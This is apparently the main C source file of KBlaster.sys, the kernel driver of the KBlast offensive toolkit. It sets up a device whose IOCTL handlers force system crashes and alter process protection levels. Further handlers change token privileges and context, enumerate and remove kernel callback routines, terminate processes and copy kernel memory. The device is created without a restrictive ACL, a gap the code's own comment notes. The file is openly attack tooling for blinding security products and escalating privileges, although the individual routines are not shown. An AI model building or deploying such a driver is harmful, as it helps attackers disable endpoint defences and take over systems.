/*
* Author:	Angelo Frasca Caccia ( lem0nSec_ )
* Title:	KBlaster.sys ( driver )
* Website:	https://github.com/lem0nSec/KBlast
*/


#include "KBlaster.hpp"


UNICODE_STRING symlink = RTL_CONSTANT_STRING(L"\\??\\KBlaster");


__declspec(code_seg("PAGE"))
static
NTSTATUS Kblaster_main_DeviceControl(
	_In_ PDEVICE_OBJECT pDeviceObject, 
	_In_ PIRP pIRP)
{
	PAGED_CODE();

	UNREFERENCED_PARAMETER(pDeviceObject);

	NTSTATUS status = 0;
	PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(pIRP);
	ULONG IoControlCode = stack->Parameters.DeviceIoControl.IoControlCode;
	ULONG CtlMethod = METHOD_FROM_CTL_CODE(IoControlCode);
	ULONG InputBufferLength = stack->Parameters.DeviceIoControl.InputBufferLength;
	ULONG OutputBufferLength = stack->Parameters.DeviceIoControl.OutputBufferLength;
	PVOID pInputBuffer = 0;
	PVOID pOutputBuffer = 0;
	
	
	if (CtlMethod == METHOD_NEITHER) {
		pInputBuffer = stack->Parameters.DeviceIoControl.Type3InputBuffer;
		pOutputBuffer = pIRP->UserBuffer;
	}
	else {
		pOutputBuffer = pInputBuffer = pIRP->AssociatedIrp.SystemBuffer;
	}

	switch (IoControlCode)
	{
	case KBLASTER_IOCTL_MISC_BUG_CHECK:
		KeBugCheck(MANUALLY_INITIATED_CRASH);
		break;

	case KBLASTER_IOCTL_PROTECTION:
		status = Kblaster_ppl_SetProtection(pInputBuffer, InputBufferLength);
		break;

	case KBLASTER_IOCTL_TOKEN_PRIVILEGES:
		status = Kblaster_token_SetPrivileges(pInputBuffer, InputBufferLength);
		break;

	case KBLASTER_IOCTL_TOKEN_CONTEXT:
		status = Kblaster_token_SetContext(pInputBuffer, InputBufferLength);
		break;

	case KBLASTER_IOCTL_CALLBACK_ENUM:
		status = Kblaster_callback_EnumerateRoutines(pInputBuffer, InputBufferLength, OutputBufferLength);
		break;

	case KBLASTER_IOCTL_CALLBACK_REMOVE:
		status = Kblaster_callback_RemoveRoutine(pInputBuffer, InputBufferLength);
		break;

	case KBLASTER_IOCTL_PROCESS_TERMINATE:
		status = Kblaster_process_TerminateProcess(pInputBuffer, InputBufferLength);
		break;

	case KBLASTER_IOCTL_MISC_MEMORY:
		status = Kblaster_memory_CopyMemory(pInputBuffer, InputBufferLength);
		break;

	default:
		status = STATUS_INVALID_PARAMETER;
		break;
	}

	pIRP->IoStatus.Information = OutputBufferLength;
	pIRP->IoStatus.Status = status;
	IoCompleteRequest(pIRP, IO_NO_INCREMENT);

	return status;

}


__declspec(code_seg("PAGE"))
static
NTSTATUS KBlaster_main_CreateClose(
	_In_ PDEVICE_OBJECT pDeviceObject, 
	_In_ PIRP pIRP)
{
	PAGED_CODE();

	NTSTATUS status = 1;
	PIO_STACK_LOCATION stack = IoGetCurrentIrpStackLocation(pIRP);
	
	UNREFERENCED_PARAMETER(pDeviceObject);

	switch (stack->MajorFunction)
	{
	case IRP_MJ_CREATE:
		status = STATUS_SUCCESS;
		break;

	case IRP_MJ_CLOSE:
		status = STATUS_SUCCESS;
		break;

	default:
		break;
	}

	pIRP->IoStatus.Information = 0;
	pIRP->IoStatus.Status = status;
	IoCompleteRequest(pIRP, IO_NO_INCREMENT);

	return status;

}


__declspec(code_seg("PAGE"))
static
void KBlaster_main_Unload(
	_In_ PDRIVER_OBJECT DriverObject)
{
	PAGED_CODE();

	IoDeleteDevice(DriverObject->DeviceObject);
	IoDeleteSymbolicLink(&symlink);

	return;
}


__declspec(code_seg("PAGE"))
NTSTATUS DriverEntry(
	_In_ PDRIVER_OBJECT DriverObject, 
	_In_ PUNICODE_STRING RegistryPath)
{
	PAGED_CODE();

	UNREFERENCED_PARAMETER(RegistryPath);

	NTSTATUS status = 1;
	UNICODE_STRING deviceName = RTL_CONSTANT_STRING(L"\\Device\\KBlaster");

	status = Kblaster_assist_Initialize();
	if (!NT_SUCCESS(status)) {
		goto Exit;
	}

	DriverObject->MajorFunction[IRP_MJ_CREATE] = KBlaster_main_CreateClose;
	DriverObject->MajorFunction[IRP_MJ_CLOSE] = KBlaster_main_CreateClose;
	DriverObject->MajorFunction[IRP_MJ_DEVICE_CONTROL] = Kblaster_main_DeviceControl;
	DriverObject->DriverUnload = KBlaster_main_Unload;

	// Use IoCreateSecureDevice instead
	status = IoCreateDevice(DriverObject, 0, &deviceName, FILE_DEVICE_UNKNOWN, FILE_DEVICE_SECURE_OPEN, FALSE, &DriverObject->DeviceObject);
	if (!NT_SUCCESS(status)) {
		goto Exit;
	}
	
	status = IoCreateSymbolicLink(&symlink, &deviceName);

Exit:
	return status;

}